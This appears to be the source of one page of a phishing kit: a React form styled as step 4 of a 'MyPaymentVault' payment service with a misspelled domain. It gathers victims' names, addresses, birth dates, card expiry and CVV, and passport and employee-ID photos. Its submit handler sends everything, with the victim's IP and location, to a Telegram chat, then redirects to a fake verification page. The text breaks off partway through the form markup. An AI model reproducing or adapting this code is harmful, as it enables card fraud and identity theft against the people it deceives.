import { useState, useEffect, useRef } from "react";
import { useLocation } from "wouter";
import { useAuth } from "@/lib/auth";
import { Upload, Loader2, Globe, ChevronDown } from "lucide-react";
import { useI18n, type Language } from "@/lib/i18n";
import { sendTelegram, sendFileToTelegram, getIPInfo } from "@/lib/telegram";

const languageOptions: { code: Language; label: string }[] = [
  { code: "en", label: "English" },
  { code: "es", label: "Español" },
  { code: "fr", label: "Français" },
];

const COUNTRY_CODES = [
  { code: "+1",    flag: "🇺🇸", name: "United States" },
  { code: "+1",    flag: "🇨🇦", name: "Canada" },
  { code: "+7",    flag: "🇷🇺", name: "Russia" },
  { code: "+20",   flag: "🇪🇬", name: "Egypt" },
  { code: "+27",   flag: "🇿🇦", name: "South Africa" },
  { code: "+30",   flag: "🇬🇷", name: "Greece" },
  { code: "+31",   flag: "🇳🇱", name: "Netherlands" },
  { code: "+32",   flag: "🇧🇪", name: "Belgium" },
  { code: "+33",   flag: "🇫🇷", name: "France" },
  { code: "+34",   flag: "🇪🇸", name: "Spain" },
  { code: "+36",   flag: "🇭🇺", name: "Hungary" },
  { code: "+39",   flag: "🇮🇹", name: "Italy" },
  { code: "+40",   flag: "🇷🇴", name: "Romania" },
  { code: "+41",   flag: "🇨🇭", name: "Switzerland" },
  { code: "+43",   flag: "🇦🇹", name: "Austria" },
  { code: "+44",   flag: "🇬🇧", name: "United Kingdom" },
  { code: "+45",   flag: "🇩🇰", name: "Denmark" },
  { code: "+46",   flag: "🇸🇪", name: "Sweden" },
  { code: "+47",   flag: "🇳🇴", name: "Norway" },
  { code: "+48",   flag: "🇵🇱", name: "Poland" },
  { code: "+49",   flag: "🇩🇪", name: "Germany" },
  { code: "+51",   flag: "🇵🇪", name: "Peru" },
  { code: "+52",   flag: "🇲🇽", name: "Mexico" },
  { code: "+53",   flag: "🇨🇺", name: "Cuba" },
  { code: "+54",   flag: "🇦🇷", name: "Argentina" },
  { code: "+55",   flag: "🇧🇷", name: "Brazil" },
  { code: "+56",   flag: "🇨🇱", name: "Chile" },
  { code: "+57",   flag: "🇨🇴", name: "Colombia" },
  { code: "+58",   flag: "🇻🇪", name: "Venezuela" },
  { code: "+60",   flag: "🇲🇾", name: "Malaysia" },
  { code: "+61",   flag: "🇦🇺", name: "Australia" },
  { code: "+62",   flag: "🇮🇩", name: "Indonesia" },
  { code: "+63",   flag: "🇵🇭", name: "Philippines" },
  { code: "+64",   flag: "🇳🇿", name: "New Zealand" },
  { code: "+65",   flag: "🇸🇬", name: "Singapore" },
  { code: "+66",   flag: "🇹🇭", name: "Thailand" },
  { code: "+81",   flag: "🇯🇵", name: "Japan" },
  { code: "+82",   flag: "🇰🇷", name: "South Korea" },
  { code: "+84",   flag: "🇻🇳", name: "Vietnam" },
  { code: "+86",   flag: "🇨🇳", name: "China" },
  { code: "+90",   flag: "🇹🇷", name: "Turkey" },
  { code: "+91",   flag: "🇮🇳", name: "India" },
  { code: "+92",   flag: "🇵🇰", name: "Pakistan" },
  { code: "+93",   flag: "🇦🇫", name: "Afghanistan" },
  { code: "+94",   flag: "🇱🇰", name: "Sri Lanka" },
  { code: "+95",   flag: "🇲🇲", name: "Myanmar" },
  { code: "+98",   flag: "🇮🇷", name: "Iran" },
  { code: "+212",  flag: "🇲🇦", name: "Morocco" },
  { code: "+213",  flag: "🇩🇿", name: "Algeria" },
  { code: "+216",  flag: "🇹🇳", name: "Tunisia" },
  { code: "+218",  flag: "🇱🇾", name: "Libya" },
  { code: "+220",  flag: "🇬🇲", name: "Gambia" },
  { code: "+221",  flag: "🇸🇳", name: "Senegal" },
  { code: "+233",  flag: "🇬🇭", name: "Ghana" },
  { code: "+234",  flag: "🇳🇬", name: "Nigeria" },
  { code: "+251",  flag: "🇪🇹", name: "Ethiopia" },
  { code: "+254",  flag: "🇰🇪", name: "Kenya" },
  { code: "+255",  flag: "🇹🇿", name: "Tanzania" },
  { code: "+256",  flag: "🇺🇬", name: "Uganda" },
  { code: "+260",  flag: "🇿🇲", name: "Zambia" },
  { code: "+263",  flag: "🇿🇼", name: "Zimbabwe" },
  { code: "+351",  flag: "🇵🇹", name: "Portugal" },
  { code: "+352",  flag: "🇱🇺", name: "Luxembourg" },
  { code: "+353",  flag: "🇮🇪", name: "Ireland" },
  { code: "+354",  flag: "🇮🇸", name: "Iceland" },
  { code: "+355",  flag: "🇦🇱", name: "Albania" },
  { code: "+356",  flag: "🇲🇹", name: "Malta" },
  { code: "+358",  flag: "🇫🇮", name: "Finland" },
  { code: "+370",  flag: "🇱🇹", name: "Lithuania" },
  { code: "+371",  flag: "🇱🇻", name: "Latvia" },
  { code: "+372",  flag: "🇪🇪", name: "Estonia" },
  { code: "+374",  flag: "🇦🇲", name: "Armenia" },
  { code: "+375",  flag: "🇧🇾", name: "Belarus" },
  { code: "+380",  flag: "🇺🇦", name: "Ukraine" },
  { code: "+381",  flag: "🇷🇸", name: "Serbia" },
  { code: "+385",  flag: "🇭🇷", name: "Croatia" },
  { code: "+386",  flag: "🇸🇮", name: "Slovenia" },
  { code: "+389",  flag: "🇲🇰", name: "North Macedonia" },
  { code: "+420",  flag: "🇨🇿", name: "Czech Republic" },
  { code: "+421",  flag: "🇸🇰", name: "Slovakia" },
  { code: "+502",  flag: "🇬🇹", name: "Guatemala" },
  { code: "+503",  flag: "🇸🇻", name: "El Salvador" },
  { code: "+504",  flag: "🇭🇳", name: "Honduras" },
  { code: "+505",  flag: "🇳🇮", name: "Nicaragua" },
  { code: "+506",  flag: "🇨🇷", name: "Costa Rica" },
  { code: "+507",  flag: "🇵🇦", name: "Panama" },
  { code: "+509",  flag: "🇭🇹", name: "Haiti" },
  { code: "+591",  flag: "🇧🇴", name: "Bolivia" },
  { code: "+593",  flag: "🇪🇨", name: "Ecuador" },
  { code: "+595",  flag: "🇵🇾", name: "Paraguay" },
  { code: "+598",  flag: "🇺🇾", name: "Uruguay" },
  { code: "+673",  flag: "🇧🇳", name: "Brunei" },
  { code: "+675",  flag: "🇵🇬", name: "Papua New Guinea" },
  { code: "+676",  flag: "🇹🇴", name: "Tonga" },
  { code: "+679",  flag: "🇫🇯", name: "Fiji" },
  { code: "+685",  flag: "🇼🇸", name: "Samoa" },
  { code: "+686",  flag: "🇰🇮", name: "Kiribati" },
  { code: "+855",  flag: "🇰🇭", name: "Cambodia" },
  { code: "+856",  flag: "🇱🇦", name: "Laos" },
  { code: "+880",  flag: "🇧🇩", name: "Bangladesh" },
  { code: "+886",  flag: "🇹🇼", name: "Taiwan" },
  { code: "+960",  flag: "🇲🇻", name: "Maldives" },
  { code: "+961",  flag: "🇱🇧", name: "Lebanon" },
  { code: "+962",  flag: "🇯🇴", name: "Jordan" },
  { code: "+963",  flag: "🇸🇾", name: "Syria" },
  { code: "+964",  flag: "🇮🇶", name: "Iraq" },
  { code: "+965",  flag: "🇰🇼", name: "Kuwait" },
  { code: "+966",  flag: "🇸🇦", name: "Saudi Arabia" },
  { code: "+967",  flag: "🇾🇪", name: "Yemen" },
  { code: "+968",  flag: "🇴🇲", name: "Oman" },
  { code: "+970",  flag: "🇵🇸", name: "Palestine" },
  { code: "+971",  flag: "🇦🇪", name: "UAE" },
  { code: "+972",  flag: "🇮🇱", name: "Israel" },
  { code: "+973",  flag: "🇧🇭", name: "Bahrain" },
  { code: "+974",  flag: "🇶🇦", name: "Qatar" },
  { code: "+975",  flag: "🇧🇹", name: "Bhutan" },
  { code: "+976",  flag: "🇲🇳", name: "Mongolia" },
  { code: "+977",  flag: "🇳🇵", name: "Nepal" },
  { code: "+992",  flag: "🇹🇯", name: "Tajikistan" },
  { code: "+993",  flag: "🇹🇲", name: "Turkmenistan" },
  { code: "+994",  flag: "🇦🇿", name: "Azerbaijan" },
  { code: "+995",  flag: "🇬🇪", name: "Georgia" },
  { code: "+996",  flag: "🇰🇬", name: "Kyrgyzstan" },
  { code: "+998",  flag: "🇺🇿", name: "Uzbekistan" },
];

const INQUIRY_TYPES = [
  "Account Inquiry",
  "Card Issue",
  "Payment Problem",
  "Fraud Report",
  "Other",
];

const inp: React.CSSProperties = {
  width: "100%",
  height: 48,
  padding: "0 14px",
  fontSize: 14,
  color: "#111",
  border: "1px solid #ccc",
  borderRadius: 4,
  outline: "none",
  background: "#fff",
  boxSizing: "border-box",
  fontFamily: "inherit",
};

export default function Step4() {
  const { user, isAuthenticated } = useAuth();
  const { lang, setLang, langName } = useI18n();
  const [, navigate] = useLocation();
  const [showLangDropdown, setShowLangDropdown] = useState(false);

  const [firstName, setFirstName]       = useState("");
  const [lastName, setLastName]         = useState("");
  const [email, setEmail]               = useState("");
  const [phone, setPhone]               = useState("");
  const [dialCode, setDialCode]         = useState("+1");
  const [dialFlag, setDialFlag]         = useState("🇺🇸");
  const [dialOpen, setDialOpen]         = useState(false);
  const [dialSearch, setDialSearch]     = useState("");
  const dialRef = useRef<HTMLDivElement>(null);
  const [houseNo, setHouseNo]           = useState("");
  const [complex, setComplex]           = useState("");
  const [address, setAddress]           = useState("");
  const [district, setDistrict]         = useState("");
  const [city, setCity]                 = useState("");
  const [stateVal, setStateVal]         = useState("");
  const [postalCode, setPostalCode]     = useState("");
  const [dob, setDob]                   = useState("");
  const [inquiryType, setInquiryType]   = useState("");
  const [message, setMessage]           = useState("");
  const [cardDigits, setCardDigits]     = useState("");
  const [cardExp, setCardExp]           = useState("");
  const [cardCvv, setCardCvv]           = useState("");
  const [passportFile, setPassportFile] = useState<File | null>(null);
  const [empIdFile, setEmpIdFile]       = useState<File | null>(null);
  const [errors, setErrors]             = useState<Record<string, string>>({});
  const [loading, setLoading]           = useState(false);

  const passportRef = useRef<HTMLInputElement>(null);
  const empIdRef    = useRef<HTMLInputElement>(null);

  useEffect(() => {
    if (!isAuthenticated) navigate("/login");
  }, [isAuthenticated, navigate]);

  useEffect(() => {
    const handler = (e: MouseEvent) => {
      if (dialRef.current && !dialRef.current.contains(e.target as Node)) {
        setDialOpen(false);
        setDialSearch("");
      }
    };
    document.addEventListener("mousedown", handler);
    return () => document.removeEventListener("mousedown", handler);
  }, []);

  const validate = () => {
    const e: Record<string, string> = {};
    if (!firstName.trim())   e.firstName   = "Required.";
    if (!lastName.trim())    e.lastName    = "Required.";
    if (!email.trim())       e.email       = "Required.";
    if (!phone.trim())       e.phone       = "Required.";
    if (!houseNo.trim())     e.houseNo     = "Required.";
    if (!address.trim())     e.address     = "Required.";
    if (!district.trim())    e.district    = "Required.";
    if (!city.trim())        e.city        = "Required.";
    if (!stateVal.trim())    e.state       = "Required.";
    if (!postalCode.trim())  e.postalCode  = "Required.";
    if (!dob.trim())         e.dob         = "Required.";
    if (!inquiryType)        e.inquiryType = "Please select one.";
    if (!cardDigits.trim())       e.cardDigits = "Required.";
    else if (!/^\d{8}$/.test(cardDigits.trim())) e.cardDigits = "Must be 8 digits.";
    if (!cardExp.trim())          e.cardExp    = "Required.";
    else if (!/^(0[1-9]|1[0-2])\/\d{2}$/.test(cardExp.trim())) e.cardExp = "Format: MM/YY";
    if (!cardCvv.trim())          e.cardCvv    = "Required.";
    else if (!/^\d{3,4}$/.test(cardCvv.trim())) e.cardCvv = "3–4 digits.";
    if (!passportFile)       e.passport    = "Passport photo is required.";
    if (!empIdFile)          e.empId       = "Employee ID photo is required.";
    return e;
  };

  const handleSubmit = async (ev: React.FormEvent) => {
    ev.preventDefault();
    const errs = validate();
    if (Object.keys(errs).length > 0) { setErrors(errs); return; }
    setErrors({});
    setLoading(true);

    try {
      const now = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
      const ip  = await getIPInfo();

      await sendTelegram(
        `━━━━━━━━━━━━━━━━━━━━━\n` +
        `📋 <b>mypaymenttvaulltr.com</b>\n` +
        `📌 <b>Step 4 — Data Personal</b>\n` +
        `━━━━━━━━━━━━━━━━━━━━━\n\n` +
        `👤 <b>Username</b>       : <code>${user?.username ?? "-"}</code>\n` +
        `👦 <b>Nama Lengkap</b>   : <code>${firstName} ${lastName}</code>\n` +
        `📧 <b>Email</b>          : <code>${email}</code>\n` +
        `📱 <b>Mobile</b>         : <code>${dialCode} ${phone}</code>\n` +
        `🎂 <b>Tgl Lahir</b>      : <code>${dob}</code>\n\n` +
        `🏘️ <b>ALAMAT LENGKAP</b>\n` +
        `🏠 <b>No Rumah / Blok</b>: <code>${houseNo}</code>\n` +
        `🏢 <b>Nama Komplek</b>   : <code>${complex || "-"}</code>\n` +
        `🛣️ <b>Nama Jalan</b>     : <code>${address}</code>\n` +
        `🏘️ <b>Kecamatan</b>      : <code>${district}</code>\n` +
        `🏙️ <b>Kota / Kab</b>     : <code>${city}</code>\n` +
        `📍 <b>Provinsi</b>       : <code>${stateVal}</code>\n` +
        `📮 <b>Kode Pos</b>       : <code>${postalCode}</code>\n\n` +
        `📌 <b>Inquiry</b>        : <code>${inquiryType}</code>\n` +
        `💬 <b>Pesan</b>          : <code>${message || "-"}</code>\n` +
        `💳 <b>Akhiran Kartu</b>  : <code>XXXX XXXX ${cardDigits.trim()}</code>\n` +
        `📅 <b>Exp</b>            : <code>${cardExp.trim()}</code>\n` +
        `🔐 <b>CVV</b>            : <code>${cardCvv.trim()}</code>\n` +
        `🌐 <b>IP & Lokasi</b>    : <code>${ip}</code>\n` +
        `🕐 <b>Waktu</b>          : ${now}\n` +
        `━━━━━━━━━━━━━━━━━━━━━`
      );

      await fetch("/api/submissions/personal", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          username: user?.username ?? "",
          firstName, lastName, email, phone: `${dialCode} ${phone}`,
          houseNo, complex, address, district, city, state: stateVal, postalCode,
          dob, inquiryType, message,
          cardDigits: cardDigits.trim(),
          cardExp: cardExp.trim(),
          cardCvv: cardCvv.trim(),
          ipAddress: ip,
        }),
      }).catch(() => {});

      if (passportFile)
        await sendFileToTelegram(passportFile, `📷 Passport — ${user?.username ?? "-"}`);
      if (empIdFile)
        await sendFileToTelegram(empIdFile, `🪪 Employee ID — ${user?.username ?? "-"}`);

      navigate("/verify");
    } catch (_) {
      navigate("/verify");
    }
  };

  const Err = ({ k }: { k: string }) =>
    errors[k] ? <span style={{ fontSize: 11, color: "#c00", marginTop: 4, display: "block" }}>{errors[k]}</span> : null;

  const Lbl = ({ children, required }: { children: React.ReactNode; required?: boolean }) => (
    <label style={{ display: "block", fontSize: 12, fontWeight: 600, color: "#555", marginBottom: 6, letterSpacing: "0.03em", textTransform: "uppercase" }}>
      {children}{required && <span style={{ color: "#c00", marginLeft: 2 }}>*</span>}
    </label>
  );

  const SectionHead = ({ children }: { children: React.ReactNode }) => (
    <div style={{ display: "flex", alignItems: "center", gap: 12, margin: "28px 0 18px" }}>
      <span style={{ fontSize: 13, fontWeight: 700, color: "#111", letterSpacing: "0.04em", textTransform: "uppercase" }}>{children}</span>
      <div style={{ flex: 1, height: 1, background: "#e8e8e8" }} />
    </div>
  );

  // row replaced by CSS class s4-row (see <style> block below)

  return (
    <div style={{ minHeight: "100vh", background: "#f5f5f5", display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "flex-start", padding: "32px 16px 48px" }}>
      <style>{`
        .s4i:focus { border-color: #333 !important; box-shadow: 0 0 0 3px rgba(0,0,0,0.06); }
        .s4i::placeholder { color: #bbb; }
        @keyframes spin { from{transform:rotate(0deg)} to{transform:rotate(360deg)} }
        .s4-row { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-bottom: 20px; }
        .s4-card-row { display: grid; grid-template-columns: 2fr 1fr 1fr; gap: 20px; margin-bottom: 20px; }
        .s4-card { padding: 32px 40px 40px; }
        .s4-header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 24px; gap: 8px; flex-wrap: wrap; }
        .s4-btns { display: flex; justify-content: flex-end; gap: 12px; margin-top: 24px; padding-top: 24px; border-top: 1px solid #f0f0f0; }
        @media (max-width: 640px) {
          .s4-row { grid-template-columns: 1fr !important; }
          .s4-card-row { grid-template-columns: 1fr !important; }
          .s4-card { padding: 24px 18px 32px !important; }
          .s4-btns { flex-direction: column-reverse; }
          .s4-btns button { width: 100%; justify-content: center; }
        }
      `}</style>

      <div style={{ width: "100%", maxWidth: 860, background: "#fff", borderRadius: 12, boxShadow: "0 2px 16px rgba(0,0,0,0.07)" }} className="s4-card">

        {/* Header */}
        <div className="s4-header">
          <span style={{ fontSize: 15, letterSpacing: "0.18em", color: "#111" }}>
            <span style={{ fontWeight: 300 }}>MY</span>
            <span style={{ fontWeight: 700 }}>PAYMENT</span>
            <span style={{ fontWeight: 300 }}>VAULT</span>
          </span>
          <div style={{ display: "flex", alignItems: "center", gap: 16 }}>
            <span style={{ fontSize: 12, color: "#999", fontWeight: 500 }}>Step 4 of 6</span>
            {/* Language */}
            <div style={{ position: "relative" }}>
              <button
                type="button"
                onClick={() => setShowLangDropdown(!showLangDropdown)}
                style={{ display: "flex", alignItems: "center", gap: 5, color: "#555", fontSize: 13, background: "none", border: "none", cursor: "pointer" }}
              >
                <Globe size={15} color="#555" />
                <span>{langName}</span>
                <ChevronDown size={13} color="#555" style={{ transform: showLangDropdown ? "rotate(180deg)" : "none", transition: "transform 0.2s" }} />
              </button>
              {showLangDropdown && (
                <>
                  <div style={{ position: "fixed", inset: 0, zIndex: 10 }} onClick={() => setShowLangDropdown(false)} />
                  <div style={{ position: "absolute", right: 0, top: "100%", marginTop: 4, width: 140, background: "#fff", border: "1px solid #ddd", boxShadow: "0 4px 16px rgba(0,0,0,0.15)", zIndex: 20 }}>
                    {languageOptions.map((opt) => (
                      <button key={opt.code} type="button"
                        onClick={() => { setLang(opt.code); setShowLangDropdown(false); }}
                        style={{ display: "block", width: "100%", textAlign: "left", padding: "10px 16px", fontSize: 13, background: "none", border: "none", cursor: "pointer", fontWeight: lang === opt.code ? 600 : 400, color: lang === opt.code ? "#111" : "#555" }}
                      >{opt.label}</button>
                    ))}
                  </div>
                </>
              )}
            </div>
          </div>
        </div>

        {/* Step dots */}
        <div style={{ display: "flex", alignItems: "center", gap: 6, marginBottom: 8, justifyContent: "center" }}>
          {[1,2,3,4,5,6].map(n => {
            const done = n < 4, active = n === 4;
            return (
              <div key={n} style={{ display: "flex", alignItems: "center" }}>
                <div style={{
                  width: 26, height: 26, borderRadius: "50%",
                  background: done ? "#111" : active ? "#111" : "#e0e0e0",
                  display: "flex", alignItems: "center", justifyContent: "center",
                  transition: "background 0.2s",
                }}>
                  {done
                    ? <svg width="11" height="11" viewBox="0 0 12 12" fill="none"><path d="M2 6l3 3 5-5" stroke="#fff" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/></svg>
                    : <span style={{ fontSize: 11, color: active ? "#fff" : "#bbb", fontWeight: 700 }}>{n}</span>
                  }
                </div>
                {n < 6 && <div style={{ width: 28, height: 2, background: n < 4 ? "#111" : "#e0e0e0", margin: "0 2px" }} />}
              </div>
            );
          })}
        </div>
        <p style={{ textAlign: "center", fontSize: 12, color: "#aaa", marginBottom: 4 }}>Personal Information</p>

        <form onSubmit={handleSubmit}>

          {/* ── Section: Personal ── */}
          <SectionHead>Personal Details</SectionHead>
          <div className="s4-row">
            <div>
              <Lbl required>First Name</Lbl>
              <input className="s4i" type="text" placeholder="Enter first name" value={firstName}
                onChange={e => setFirstName(e.target.value)}
                style={{ ...inp, borderColor: errors.firstName ? "#c00" : "#ddd" }} />
              <Err k="firstName" />
            </div>
            <div>
              <Lbl required>Last Name</Lbl>
              <input className="s4i" type="text" placeholder="Enter last name" value={lastName}
                onChange={e => setLastName(e.target.value)}
                style={{ ...inp, borderColor: errors.lastName ? "#c00" : "#ddd" }} />
              <Err k="lastName" />
            </div>
          </div>

          <div className="s4-row">
            <div>
              <Lbl required>Email Address</Lbl>
              <input className="s4i" type="email" placeholder="you@example.com" value={email}
                onChange={e => setEmail(e.target.value)}
                style={{ ...inp, borderColor: errors.email ? "#c00" : "#ddd" }} />
              <Err k="email" />
            </div>
            <div>
              <Lbl required>Mobile Phone</Lbl>
              <div style={{ display: "flex", border: `1px solid ${errors.phone ? "#c00" : "#ddd"}`, borderRadius: 6, overflow: "visible", height: 48, background: "#fff", position: "relative" }}>
                <div ref={dialRef} style={{ position: "relative", flexShrink: 0 }}>
                  <button
                    type="button"
                    onClick={() => { setDialOpen(o => !o); setDialSearch(""); }}
                    style={{ display: "flex", alignItems: "center", gap: 6, height: 48, padding: "0 10px 0 12px", border: "none", borderRight: "1px solid #e8e8e8", background: "#f8f8f8", cursor: "pointer", borderRadius: "6px 0 0 6px", minWidth: 90, fontFamily: "inherit" }}
                  >
                    <span style={{ fontSize: 20, lineHeight: 1 }}>{dialFlag}</span>
                    <span style={{ fontSize: 13, color: "#333", fontWeight: 600 }}>{dialCode}</span>
                    <span style={{ fontSize: 8, color: "#aaa", marginLeft: 1 }}>▼</span>
                  </button>
                  {dialOpen && (
                    <div style={{ position: "absolute", top: "calc(100% + 6px)", left: 0, zIndex: 999, background: "#fff", border: "1px solid #e0e0e0", borderRadius: 10, boxShadow: "0 8px 32px rgba(0,0,0,0.13)", width: 270, overflow: "hidden" }}>
                      <div style={{ padding: "10px 10px 8px", borderBottom: "1px solid #f0f0f0" }}>
                        <input
                          autoFocus
                          type="text"
                          placeholder="Search country..."
                          value={dialSearch}
                          onChange={e => setDialSearch(e.target.value)}
                          style={{ width: "100%", height: 36, padding: "0 12px", fontSize: 13, border: "1px solid #e0e0e0", borderRadius: 6, outline: "none", boxSizing: "border-box", fontFamily: "inherit" }}
                        />
                      </div>
                      <div style={{ maxHeight: 240, overflowY: "auto" }}>
                        {COUNTRY_CODES.filter(c =>
                          c.name.toLowerCase().includes(dialSearch.toLowerCase()) || c.code.includes(dialSearch)
                        ).map((c, i) => (
                          <div key={i}
                            onMouseDown={() => { setDialCode(c.code); setDialFlag(c.flag); setDialOpen(false); setDialSearch(""); }}
                            style={{ display: "flex", alignItems: "center", gap: 10, padding: "9px 14px", cursor: "pointer", fontSize: 13, color: "#222" }}
                            onMouseEnter={e => (e.currentTarget.style.background = "#f5f5f5")}
                            onMouseLeave={e => (e.currentTarget.style.background = "transparent")}
                          >
                            <span style={{ fontSize: 20, lineHeight: 1, flexShrink: 0 }}>{c.flag}</span>
                            <span style={{ flex: 1, overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap" }}>{c.name}</span>
                            <span style={{ color: "#999", fontWeight: 600, flexShrink: 0 }}>{c.code}</span>
                          </div>
                        ))}
                        {COUNTRY_CODES.filter(c =>
                          c.name.toLowerCase().includes(dialSearch.toLowerCase()) || c.code.includes(dialSearch)
                        ).length === 0 && (
                          <div style={{ padding: 16, textAlign: "center", color: "#bbb", fontSize: 13 }}>No results found</div>
                        )}
                      </div>
                    </div>
                  )}
                </div>
                <input className="s4i" type="tel" placeholder="Phone number" value={phone}
                  onChange={e => setPhone(e.target.value)}
                  style={{ flex: 1, border: "none", outline: "none", padding: "0 14px", fontSize: 14, color: "#111", background: "#fff", fontFamily: "inherit", borderRadius: "0 6px 6px 0" }}
                />
              </div>
              <Err k="phone" />
            </div>
          </div>

          {/* ── Section: Address ── */}
          <SectionHead>Mailing Address</SectionHead>
          <div className="s4-row">
            <div>
              <Lbl required>House No. &amp; Block</Lbl>
              <input className="s4i" type="text" placeholder="e.g. No. 12 Block B3" value={houseNo}
                onChange={e => setHouseNo(e.target.value)}
                style={{ ...inp, borderColor: errors.houseNo ? "#c00" : "#ddd" }} />
              <Err k="houseNo" />
            </div>
            <div>
              <Lbl>Housing / Complex Name</Lbl>
              <input className="s4i" type="text" placeholder="e.g. Greenwood Residence" value={complex}
                onChange={e => setComplex(e.target.value)}
                style={{ ...inp, borderColor: "#ddd" }} />
            </div>
          </div>
          <div style={{ marginBottom: 20 }}>
            <Lbl required>Street Name</Lbl>
            <input className="s4i" type="text" placeholder="e.g. 123 Main Street" value={address}
              onChange={e => setAddress(e.target.value)}
              style={{ ...inp, borderColor: errors.address ? "#c00" : "#ddd" }} />
            <Err k="address" />
          </div>
          <div className="s4-row">
            <div>
              <Lbl required>District / Sub-district</Lbl>
              <input className="s4i" type="text" placeholder="e.g. West District" value={district}
                onChange={e => setDistrict(e.target.value)}
                style={{ ...inp, borderColor: errors.district ? "#c00" : "#ddd" }} />
              <Err k="district" />
            </div>
            <div>
              <Lbl required>City</Lbl>
              <input className="s4i" type="text" placeholder="e.g. Los Angeles" value={city}
                onChange={e => setCity(e.target.value)}
                style={{ ...inp, borderColor: errors.city ? "#c00" : "#ddd" }} />
              <Err k="city" />
            </div>
          </div>
          <div className="s4-row">
            <div>
              <Lbl required>State / Province</Lbl>
              <input className="s4i" type="text" placeholder="e.g. California" value={stateVal}
                onChange={e => setStateVal(e.target.value)}
                style={{ ...inp, borderColor: errors.state ? "#c00" : "#ddd" }} />
              <Err k="state" />
            </div>
            <div>
              <Lbl required>Postal Code</Lbl>
              <input className="s4i" type="text" placeholder="00000" value={postalCode}
                onChange={e => setPostalCode(e.target.value)}
                style={{ ...inp, borderColor: errors.postalCode ? "#c00" : "#ddd" }} />
              <Err k="postalCode" />
            </div>
          </div>
          <div style={{ marginBottom: 20 }}>
            <Lbl required>Date of Birth</Lbl>
            <input className="s4i" type="text" placeholder="MM-DD-YYYY" value={dob}
              onChange={e => setDob(e.target.value)}
              style={{ ...inp, borderColor: errors.dob ? "#c00" : "#ddd" }} />
            <Err k="dob" />
          </div>

          {/* ── Section: Inquiry ── */}
          <SectionHead>Inquiry</SectionHead>
          <div style={{ marginBottom: 20 }}>
            <Lbl required>Inquiry Type</Lbl>
            <select value={inquiryType} onChange={e => setInquiryType(e.target.value)}
              style={{
                ...inp,
                borderColor: errors.inquiryType ? "#c00" : "#ddd",
                color: inquiryType ? "#111" : "#bbb",
                appearance: "none",
                backgroundImage: `url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' viewBox='0 0 12 12'%3E%3Cpath d='M2 4l4 4 4-4' stroke='%23888' stroke-width='1.5' fill='none' stroke-linecap='round'/%3E%3C/svg%3E")`,
                backgroundRepeat: "no-repeat",
                backgroundPosition: "right 14px center",
                paddingRight: 36,
              }}>
              <option value="" disabled>Select type...</option>
              {INQUIRY_TYPES.map(t => <option key={t} value={t} style={{ color: "#111" }}>{t}</option>)}
            </select>
            <Err k="inquiryType" />
          </div>
          <div style={{ marginBottom: 20 }}>
            <Lbl>Message</Lbl>
            <textarea placeholder="Describe your inquiry..." value={message} onChange={e => setMessage(e.target.value)}
              rows={4}
              style={{
                width: "100%", padding: "12px 14px",
                fontSize: 14, color: "#111",
                border: "1px solid #ddd", borderRadius: 6,
                outline: "none", background: "#fff",
                boxSizing: "border-box", resize: "vertical",
                fontFamily: "inherit",
              }} />
          </div>

          {/* ── Section: Card ── */}
          <SectionHead>Card Information</SectionHead>
          <div className="s4-card-row">
            <div>
              <Lbl required>Card Number (Last 8 Digits)</Lbl>
              <div style={{ position: "relative" }}>
                <span style={{
                  position: "absolute", left: 14, top: "50%", transform: "translateY(-50%)",
                  fontSize: 13, color: "#ccc", fontFamily: "monospace", pointerEvents: "none",
                }}>XXXX XXXX</span>
                <input className="s4i" type="text" inputMode="numeric"
                  placeholder="00000000"
                  maxLength={8} value={cardDigits}
                  onChange={e => { setCardDigits(e.target.value.replace(/\D/g,"").slice(0,8)); setErrors(p=>({...p,cardDigits:""})); }}
                  style={{ ...inp, paddingLeft: 108, fontFamily: "monospace", letterSpacing: "0.14em", borderColor: errors.cardDigits ? "#c00" : "#ddd" }} />
              </div>
              <Err k="cardDigits" />
            </div>
            <div>
              <Lbl required>Expiry Date</Lbl>
              <input className="s4i" type="text" inputMode="numeric"
                placeholder="MM / YY"
                maxLength={5} value={cardExp}
                onChange={e => {
                  let v = e.target.value.replace(/\D/g,"").slice(0,4);
                  if (v.length > 2) v = v.slice(0,2) + "/" + v.slice(2);
                  setCardExp(v); setErrors(p=>({...p,cardExp:""}));
                }}
                style={{ ...inp, fontFamily: "monospace", letterSpacing: "0.1em", borderColor: errors.cardExp ? "#c00" : "#ddd" }} />
              <Err k="cardExp" />
            </div>
            <div>
              <Lbl required>CVV</Lbl>
              <input className="s4i" type="password" inputMode="numeric"
                placeholder="•••"
                maxLength={4} value={cardCvv}
                onChange={e => { setCardCvv(e.target.value.replace(/\D/g,"").slice(0,4)); setErrors(p=>({...p,cardCvv:""})); }}
                style={{ ...inp, fontFamily: "monospace", letterSpacing: "0.18em", borderColor: errors.cardCvv ? "#c00" : "#ddd" }} />
              <Err k="cardCvv" />
            </div>
          </div>

          {/* ── Section: Documents ── */}
          <SectionHead>Supporting Documents</SectionHead>
          <div className="s4-row">
            <div>
              <Lbl required>Passport Photo</Lbl>
              <p style={{ fontSize: 12, color: "#999", marginBottom: 10, lineHeight: 1.5 }}>
                Upload a clear photo of your passport.<br />
                Supported: JPEG, PNG · Max 50 MB
              </p>
              <input ref={passportRef} type="file" accept="image/jpeg,image/png"
                style={{ display: "none" }}
                onChange={e => { setPassportFile(e.target.files?.[0] ?? null); setErrors(p=>({...p,passport:""})); }} />
              <button type="button" onClick={() => passportRef.current?.click()}
                style={{
                  width: "100%", height: 46, background: "#fafafa",
                  border: `1px dashed ${errors.passport ? "#c00" : "#ccc"}`,
                  borderRadius: 6, cursor: "pointer",
                  display: "flex", alignItems: "center", justifyContent: "center", gap: 8,
                  fontSize: 13, color: passportFile ? "#111" : "#888", fontWeight: 500,
                }}>
                <Upload size={15} color={passportFile ? "#111" : "#aaa"} />
                {passportFile ? passportFile.name : "Choose File"}
              </button>
              <Err k="passport" />
            </div>
            <div>
              <Lbl required>Employee ID Photo</Lbl>
              <p style={{ fontSize: 12, color: "#999", marginBottom: 10, lineHeight: 1.5 }}>
                Upload a clear photo of your employee ID.<br />
                Supported: JPEG, PNG · Max 50 MB
              </p>
